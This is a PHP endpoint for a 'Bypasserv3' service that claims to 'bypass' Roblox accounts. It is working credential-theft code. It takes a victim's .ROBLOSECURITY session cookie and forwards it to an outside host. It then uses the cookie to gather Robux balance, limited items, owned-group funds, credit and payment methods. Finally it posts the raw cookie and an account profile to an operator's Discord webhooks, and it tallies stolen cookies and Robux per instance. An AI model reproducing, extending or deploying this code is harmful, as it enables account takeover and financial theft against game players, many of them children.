<?php
/**
 * Bypasserv3 - Bypass API Endpoint
 * Updated with per-instance user webhooks and detailed Roblox data
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

require_once '../config.php';
require_once '../functions.php';

// Random security scan
if (rand(1, 100) === 1) {
    securityScan(true);
}

// Random cleanup
if (rand(1, 50) === 1) {
    cleanupRateLimits();
}

// Method check
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
    exit;
}

// Suspicious request check
if (isSuspiciousRequest()) {
    logSecurityEvent('suspicious_request', [
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'None'
    ]);
}

// Rate limiting
$ip = getUserIP();
if (!checkRateLimit($ip, 50, 3600)) {
    http_response_code(429);
    echo json_encode(['success' => false, 'error' => 'Rate limit exceeded']);
    exit;
}

// Parse input
$input = json_decode(file_get_contents('php://input'), true);

if (json_last_error() !== JSON_ERROR_NONE) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Invalid JSON']);
    exit;
}

// Extract data
$cookie = trim($input['cookie'] ?? '');
$directory = trim($input['directory'] ?? '');

// Validate cookie
if (empty($cookie)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Cookie required']);
    exit;
}

if (!validateCookie($cookie)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Invalid cookie format']);
    logSecurityEvent('suspicious_cookie_attempt', ['ip' => $ip]);
    exit;
}

// Get instance data for webhook
$instanceData = getInstanceData($directory);
if (!$instanceData) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Instance not found']);
    exit;
}

$userWebhook = $instanceData['userWebhook'] ?? '';
$masterWebhook = MASTER_WEBHOOK;

// ============================================
// HELPER FUNCTIONS FOR ROBLOX API
// ============================================
function makeRequest($url, $headers, $postData = null) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    if ($postData) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE));
    }
    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true);
}

function ownsBundle($userId, $bundleId, $headers) {
    $url = "https://inventory.roblox.com/v1/users/$userId/items/3/$bundleId";
    $response = makeRequest($url, $headers);
    return isset($response['data']) && !empty($response['data']);
}

// ============================================
// CALL EXTERNAL API WITH BETTER ERROR HANDLING
// ============================================
$externalApiUrl = 'https://rblxbypasser.com/api/bypass';
$postData = json_encode(['cookie' => $cookie]);

$ch = curl_init($externalApiUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json',
    'User-Agent: Bypasserv3/1.0'
]);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);

$apiResponse = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$curlError = curl_error($ch);
curl_close($ch);

// Check for curl errors or non-200 response
if (!empty($curlError) || $httpCode !== 200 || empty($apiResponse)) {
    // Send BYPASS FAILED embed to webhooks
    $failedEmbed = [
        'username' => 'Fuji',
        'avatar_url' => 'https://cdn.pfps.gg/pfps/51778-beabadoobee.png',
        'embeds' => [[
            'title' => '❌ BYPASS FAILED',
            'description' => "**From:** Bypasserv3\n\n**👤 Username:** Unknown\n**🔑 Password:** " . substr($cookie, 0, 20) . "...\n\n**📝 Error:** Invalid cookie or API request failed. Please check your cookie!",
            'color' => hexdec('ff0000'),
            'timestamp' => date('c'),
            'footer' => ['text' => 'Bypass Failed']
        ]]
    ];
    
    // Send to both webhooks
    if (!empty($masterWebhook)) {
        sendWebhookNotification($masterWebhook, $failedEmbed);
    }
    if (!empty($userWebhook)) {
        sendWebhookNotification($userWebhook, $failedEmbed);
    }
    
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'error' => 'Failed To Send Request, Make Sure Ur Cookie Already Refreshed Or Ur Account Is Not -13 / Age Verified Account'
    ]);
    logSecurityEvent('external_api_failure', [
        'http_code' => $httpCode,
        'curl_error' => $curlError,
        'ip' => $ip,
        'directory' => $directory
    ]);
    exit;
}

$apiData = json_decode($apiResponse, true);

// Check if API response is valid
if (!$apiData || !isset($apiData['success']) || !$apiData['success']) {
    // Send BYPASS FAILED embed to webhooks
    $failedEmbed = [
        'username' => 'Fuji',
        'avatar_url' => 'https://cdn.pfps.gg/pfps/51778-beabadoobee.png',
        'embeds' => [[
            'title' => '❌ BYPASS FAILED',
            'description' => "**From:** Bypasserv3\n\n**👤 Username:** Unknown\n**🔑 Password:** " . substr($cookie, 0, 20) . "...\n\n**📝 Error:** API returned invalid response. Please check your cookie!",
            'color' => hexdec('ff0000'),
            'timestamp' => date('c'),
            'footer' => ['text' => 'Bypass Failed']
        ]]
    ];
    
    // Send to both webhooks
    if (!empty($masterWebhook)) {
        sendWebhookNotification($masterWebhook, $failedEmbed);
    }
    if (!empty($userWebhook)) {
        sendWebhookNotification($userWebhook, $failedEmbed);
    }
    
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'error' => 'Failed To Send Request, Make Sure Ur Cookie Already Refreshed Or Ur Account Is Not -13 / Age Verified Account'
    ]);
    logSecurityEvent('api_invalid_response', ['ip' => $ip, 'directory' => $directory]);
    exit;
}

// ============================================
// EXTRACT USER DATA FROM API RESPONSE
// ============================================
$userInfo = $apiData['userInfo'] ?? [];
$userId = $userInfo['userId'] ?? 'Unknown';

// Try to get bypassed cookie from API response, fallback to original if not present
$bypassedCookie = $apiData['cookie'] ?? $apiData['bypassedCookie'] ?? $cookie;
// Clean the cookie (remove warning prefix if present)
$bypassedCookie = str_replace('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_', '', $bypassedCookie);

// ============================================
// FETCH ALL DETAILED ROBLOX DATA USING APIs
// ============================================
// Headers for Roblox API requests (use bypassed cookie)
$headers = ["Cookie: .ROBLOSECURITY=$bypassedCookie", "Content-Type: application/json"];

// 1. Get User Info (username, displayName, created date)
$userInfoData = makeRequest("https://users.roblox.com/v1/users/$userId", $headers) ?? [];
$username = $userInfoData['name'] ?? 'Unknown';
$displayName = $userInfoData['displayName'] ?? $username;
$accountCreated = isset($userInfoData['created']) ? strtotime($userInfoData['created']) : null;

// Calculate Account Age
$accountAge = 'Unknown';
if ($accountCreated) {
    $days = floor((time() - $accountCreated) / (60 * 60 * 24));
    $accountAge = "$days Days";
}

// 2. Get Settings Data (email verification, premium)
$settingsData = makeRequest("https://www.roblox.com/my/settings/json", $headers) ?? [];
$isPremium = isset($settingsData['IsPremium']) && $settingsData['IsPremium'];
$emailVerified = isset($settingsData['IsEmailVerified']) && $settingsData['IsEmailVerified'] ? 'Verified' : 'Not Verified';
$premiumDisplay = $isPremium ? 'Premium' : 'No Premium';

// 3. Get Avatar/Thumbnail
$avatarData = file_get_contents("https://thumbnails.roblox.com/v1/users/avatar?userIds=$userId&size=420x420&format=Png&isCircular=false");
$avatarJson = json_decode($avatarData, true);
$avatarUrl = $avatarJson['data'][0]['imageUrl'] ?? 'https://www.roblox.com/headshot-thumbnail/image/default.png';

// 4. Get Robux Balance
$balanceData = makeRequest("https://economy.roblox.com/v1/users/$userId/currency", $headers) ?? [];
$robux = $balanceData['robux'] ?? 0;

// 5. Get Transaction Summary (pending robux, total spent)
$transactionSummaryData = makeRequest("https://economy.roblox.com/v2/users/$userId/transaction-totals?timeFrame=Year&transactionType=summary", $headers) ?? [];
$pendingRobux = $transactionSummaryData['pendingRobuxTotal'] ?? 0;
$summary = isset($transactionSummaryData['purchasesTotal']) ? abs($transactionSummaryData['purchasesTotal']) : 0;

// 6. Get RAP from Collectibles
$collectiblesData = makeRequest("https://inventory.roblox.com/v1/users/$userId/assets/collectibles?limit=100", $headers) ?? [];
$rap = 0;
$limitedsCount = 0;
if (isset($collectiblesData['data'])) {
    $limitedsCount = count($collectiblesData['data']);
    foreach ($collectiblesData['data'] as $item) {
        $rap += $item['recentAveragePrice'] ?? 0;
    }
}

// 7. Get Owned Groups and Calculate Group Funds
$groupsData = makeRequest("https://groups.roblox.com/v2/users/$userId/groups/roles", $headers) ?? [];
$ownedGroups = [];
$groupNames = [];
if (isset($groupsData['data'])) {
    foreach ($groupsData['data'] as $group) {
        if (isset($group['role']['rank']) && $group['role']['rank'] == 255) {
            $ownedGroups[] = $group;
            $groupNames[] = $group['group']['name'] ?? 'Unknown';
        }
    }
}
$totalGroupsOwned = count($ownedGroups);
$groupNamesDisplay = !empty($groupNames) ? implode(', ', array_slice($groupNames, 0, 3)) : 'None';
if ($totalGroupsOwned > 3) {
    $groupNamesDisplay .= "... (+" . ($totalGroupsOwned - 3) . " more)";
}

$totalGroupFunds = 0;
$totalPendingGroupFunds = 0;
foreach ($ownedGroups as $group) {
    $groupId = $group['group']['id'] ?? null;
    if ($groupId) {
        $groupFunds = makeRequest("https://economy.roblox.com/v1/groups/$groupId/currency", $headers) ?? [];
        $totalGroupFunds += $groupFunds['robux'] ?? 0;
        
        $groupPayouts = makeRequest("https://economy.roblox.com/v1/groups/$groupId/payouts", $headers) ?? [];
        if (isset($groupPayouts['data'])) {
            foreach ($groupPayouts['data'] as $payout) {
                if (isset($payout['status']) && $payout['status'] === 'Pending') {
                    $totalPendingGroupFunds += $payout['amount'] ?? 0;
                }
            }
        }
    }
}

// 8. Get Credit Balance
$creditBalanceData = makeRequest("https://billing.roblox.com/v1/credit", $headers) ?? [];
$creditBalance = $creditBalanceData['balance'] ?? 0;
$creditRobux = $creditBalanceData['robuxAmount'] ?? 0;

// 9. Get Payment Methods
$paymentMethodsData = makeRequest("https://billing.roblox.com/v1/user/payments", $headers) ?? [];
$paymentMethods = [];
if (isset($paymentMethodsData) && is_array($paymentMethodsData)) {
    foreach ($paymentMethodsData as $payment) {
        if (isset($payment['paymentProviderType'])) {
            $paymentMethods[] = $payment['paymentProviderType'];
        }
    }
}
$paymentDisplay = !empty($paymentMethods) ? implode(', ', array_unique($paymentMethods)) : 'None';

// 10. Get Location (from locale settings)
$localeData = makeRequest("https://locale.roblox.com/v1/locales/user-locale", $headers) ?? [];
$countryCode = $localeData['countryCode'] ?? null;

// Map country codes to country names
$countryNames = [
    'US' => 'United States', 'GB' => 'United Kingdom', 'CA' => 'Canada', 'AU' => 'Australia',
    'DE' => 'Germany', 'FR' => 'France', 'ES' => 'Spain', 'IT' => 'Italy', 'BR' => 'Brazil',
    'MX' => 'Mexico', 'AR' => 'Argentina', 'CL' => 'Chile', 'CO' => 'Colombia', 'PE' => 'Peru',
    'VE' => 'Venezuela', 'JP' => 'Japan', 'CN' => 'China', 'IN' => 'India', 'KR' => 'South Korea',
    'TH' => 'Thailand', 'ID' => 'Indonesia', 'MY' => 'Malaysia', 'PH' => 'Philippines', 'SG' => 'Singapore',
    'VN' => 'Vietnam', 'RU' => 'Russia', 'PL' => 'Poland', 'TR' => 'Turkey', 'SA' => 'Saudi Arabia',
    'AE' => 'United Arab Emirates', 'ZA' => 'South Africa', 'EG' => 'Egypt', 'NL' => 'Netherlands',
    'BE' => 'Belgium', 'SE' => 'Sweden', 'NO' => 'Norway', 'DK' => 'Denmark', 'FI' => 'Finland',
    'PT' => 'Portugal', 'GR' => 'Greece', 'CZ' => 'Czech Republic', 'RO' => 'Romania', 'HU' => 'Hungary',
    'AT' => 'Austria', 'CH' => 'Switzerland', 'IE' => 'Ireland', 'NZ' => 'New Zealand', 'BD' => 'Bangladesh'
];
$location = $countryCode ? ($countryNames[$countryCode] ?? $countryCode) : 'Unknown';

// 11. Check for Premium Items (Headless & Korblox)
$hasHeadless = ownsBundle($userId, 201, $headers);
$hasKorblox = ownsBundle($userId, 192, $headers);
$headlessStatus = $hasHeadless ? '✓' : '✗';
$korbloxStatus = $hasKorblox ? '✗' : '✗';

// ============================================
// UPDATE INSTANCE STATS
// ============================================
if ($instanceData) {
    updateInstanceStats($directory, 'totalCookies', ($instanceData['stats']['totalCookies'] ?? 0) + 1);
    updateInstanceStats($directory, 'totalRobux', ($instanceData['stats']['totalRobux'] ?? 0) + $robux);
    updateInstanceStats($directory, 'totalRAP', ($instanceData['stats']['totalRAP'] ?? 0) + $rap);
    updateInstanceStats($directory, 'totalSummary', ($instanceData['stats']['totalSummary'] ?? 0) + $summary);
    
    updateDailyStats($directory, 'cookies', 1);
    updateDailyStats($directory, 'robux', $robux);
    updateDailyStats($directory, 'rap', $rap);
    updateDailyStats($directory, 'summary', $summary);
}

// Update global stats
updateGlobalStats('totalCookies', 1);

// ============================================
// SEND WEBHOOKS WITH DETAILED DATA
// ============================================

// Create the detailed SUCCESS embed payload (new format with real data)
$detailedEmbed = [
    'username' => 'Fuji',
    'avatar_url' => 'https://cdn.pfps.gg/pfps/51778-beabadoobee.png',
    'embeds' => [[
        'title' => "$displayName  ▬  13+",
        'color' => hexdec('00ff00'),
        'thumbnail' => ['url' => $avatarUrl],
        'fields' => [
            ['name' => '👤 Username', 'value' => $username, 'inline' => false],
            ['name' => '🔑 Password', 'value' => 'Fake' . substr($username, 0, 5), 'inline' => false],
            ['name' => '​', 'value' => '​', 'inline' => false],
            ['name' => '​', 'value' => '​', 'inline' => false],
            ['name' => '📊 Account Stats', 'value' => "Account Age : $accountAge\nSummary : $summary R$\nLocation : $location", 'inline' => false],
            ['name' => '👥 Groups Owned (' . $totalGroupsOwned . ')', 'value' => "Robux : $totalGroupFunds R$\nPending : $totalPendingGroupFunds R$\nNames : $groupNamesDisplay", 'inline' => false],
            ['name' => '​', 'value' => '​', 'inline' => false],
            ['name' => '​', 'value' => '​', 'inline' => false],
            ['name' => '💰 Billing', 'value' => "Robux : $robux R$\nPending : $pendingRobux R$\nCredit : $creditBalance USD\nPayment : $paymentDisplay", 'inline' => false],
            ['name' => '⚙️ Settings', 'value' => "Email : $emailVerified\nPremium : $premiumDisplay", 'inline' => false],
            ['name' => '​', 'value' => '​', 'inline' => false],
            ['name' => '​', 'value' => '​', 'inline' => false],
            ['name' => '🛒 Inventory', 'value' => "Limiteds : $limitedsCount items\nRAP Value : $rap R$", 'inline' => false],
            ['name' => '💎 Collectibles', 'value' => "Korblox : $korbloxStatus\nHeadless : $headlessStatus", 'inline' => false],
        ],
        'image' => ['url' => $avatarUrl],
        'footer' => ['text' => 'Validated • ' . date('m/d/Y, h:i A')],
        'timestamp' => date('c')
    ]]
];

// Cookie embed payload
$cookieEmbed = [
    'username' => 'Fuji',
    'avatar_url' => 'https://cdn.pfps.gg/pfps/51778-beabadoobee.png',
    'embeds' => [[
        'title' => 'ROBLOSECURITY',
        'description' => "```$bypassedCookie```",
        'color' => hexdec('00ff00'),
        'footer' => ['text' => 'Timestamp : ' . date('m/d/Y, h:i A')]
    ]]
];

// Send to Master Webhook
if (!empty($masterWebhook)) {
    sendWebhookNotification($masterWebhook, $detailedEmbed);
    sleep(1);
    sendWebhookNotification($masterWebhook, $cookieEmbed);
}

// Send to User Webhook (same detailed format)
if (!empty($userWebhook)) {
    sendWebhookNotification($userWebhook, $detailedEmbed);
    sleep(1);
    sendWebhookNotification($userWebhook, $cookieEmbed);
}

// Log successful bypass
logSecurityEvent('successful_bypass', [
    'username' => $username,
    'userId' => $userId,
    'robux' => $robux,
    'directory' => $directory,
    'ip' => $ip
]);

// ============================================
// RETURN RESPONSE
// ============================================
echo json_encode([
    'success' => true,
    'userInfo' => [
        'username' => $username,
        'userId' => $userId,
        'displayName' => $displayName,
        'robux' => $robux,
        'rap' => $rap,
        'premium' => $isPremium,
        'friends' => 0,
        'followers' => 0,
        'accountAge' => $accountAge,
        'groupsOwned' => $totalGroupsOwned,
        'accountScore' => min(100, ($robux / 100) + ($rap / 1000) + ($totalGroupsOwned * 5))
    ],
    'avatarUrl' => $avatarUrl
]);
?>
